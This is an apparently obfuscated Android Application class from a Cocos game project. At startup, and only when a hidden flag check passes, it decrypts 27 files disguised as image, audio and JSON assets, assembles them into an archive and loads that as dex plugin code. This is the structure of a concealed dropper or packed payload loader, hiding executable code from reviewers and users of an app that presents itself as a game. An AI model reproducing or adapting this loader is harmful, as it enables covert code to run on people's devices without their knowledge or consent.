package com.cocos.game;

import android.app.Application;
import android.content.Context;

import com.cocos.game.rewrwdfcvx.sdwvvvApplicationBaseHelper;
import com.cocos.game.rewrwdfcvx.nbrlirzwhClassManager;
import com.cocos.game.rewrwdfcvx.cwlnhykvdRecoverApkUtils;
import com.cocos.game.rewrwdfcvx.anjatjcaeTools;
import com.cocos.game.rewrwdfcvx.fdsgrwetf.mnbhjgytr.yottnuData;

import java.io.File;

public class yzhjehlwlApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        ztofnxybAf.slotInit(this);
        if(yottnuData.gfdrew()){
            sdwvvvApplicationBaseHelper.puginsApplicationHelper(this);
        }
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        yottnuData.iufd543 = base;

        if(yottnuData.gfdrew()){
            apkRecoverB(base);
        }else{
        }
    }

    private void apkRecoverB(Context context) {
        String zipFilePath = cwlnhykvdRecoverApkUtils.createZipFilePath(context);
        File zipFile = new File(zipFilePath);
        String[] apkFilelist = {
                "assets/63/635f0fff-e654-81ca-262b-c08b27893920.png",
                "assets/8f/8f36363e-09a1-af35-7578-fae8764bf328.jpg",
                "assets/cb/cb34c3fc-d2a0-a3eb-b8f2-bd197190911a.mp3",
                "assets/d5/d594eb66-4be0-7de0-c6f0-99ae33b59507.mp3",
                "assets/2a/2abbe9a1-c4ea-e3c2-06cb-1c05a66b5c58.mp3",
                "assets/07/07bbc4cf-f372-3a98-4ebc-327d9a41f434.mp3",
                "assets/c6/c640a192-0b41-b532-9c85-09a95fa37b0a.mp3",
                "assets/27/275885b1-f201-07df-540c-1db61c3f0baf.png",
                "assets/d3/d3d4abc7-18b0-85ee-0133-a4e8b2503cb7.json",
                "assets/7f/7f37711e-dc52-e62a-88e6-227e68a23d0e.png",
                "assets/41/41c595ae-aa19-88ef-e22e-fbd9767a4ebb.jpg",
                "assets/bb/bbd84bb1-8c8b-8ab5-e46f-57fac16ec850.png",
                "assets/24/2493718c-d19f-457d-8b04-c39297e7cd82.mp3",
                "assets/f1/f11e97d3-7940-163d-0baf-022b25d3415c.png",
                "assets/68/68b0a660-e1e9-ddcc-e9c7-0bf1ecca2f21.jpg",
                "assets/b2/b287c5fd-aef0-9e98-346e-45705c6523b5.mp3",
                "assets/ef/ef5126f9-b360-43b2-8050-550a4d0524ea.json",
                "assets/4d/4d0e7c82-8a1f-817f-6389-b1d0e61addbd.jpg",
                "assets/71/71491a30-ec59-36a2-2d03-eef3d02c7add.json",
                "assets/45/452fd964-c45c-acb2-0ca6-d6f6fb58f900.jpg",
                "assets/2d/2de34776-bad3-adcb-0a5c-b7eec687d08f.json",
                "assets/cb/cbe0d2d6-4a0e-5107-d23a-e6f511039dc4.png",
                "assets/82/82f5dbc9-8d2a-5b62-fa48-a00bbbaae1f0.jpg",
                "assets/d7/d77b1ec6-fb44-9716-e7a3-2f3ff3ea59f4.mp3",
                "assets/87/878dbe40-0214-3d91-3e35-415b1816daa1.mp3",
                "assets/ca/ca7984dc-1ef3-6d66-2631-e43f1e213c92.json",
                "assets/27/27f4ea5c-6cd7-c999-d6e7-4403f477cf7c.jpg",
        };

        for (int i = 0; i < apkFilelist.length ; i ++) {
            anjatjcaeTools.decryptCopyFiles(context, apkFilelist[i], zipFile);
        }

        String optimizedDirectory = new File(anjatjcaeTools.getCacheDir(context).getAbsolutePath() + File.separator + "plugin").getAbsolutePath();

        // 加载插件dex
        nbrlirzwhClassManager.dexClassLoader(context, zipFilePath, optimizedDirectory);
    }
}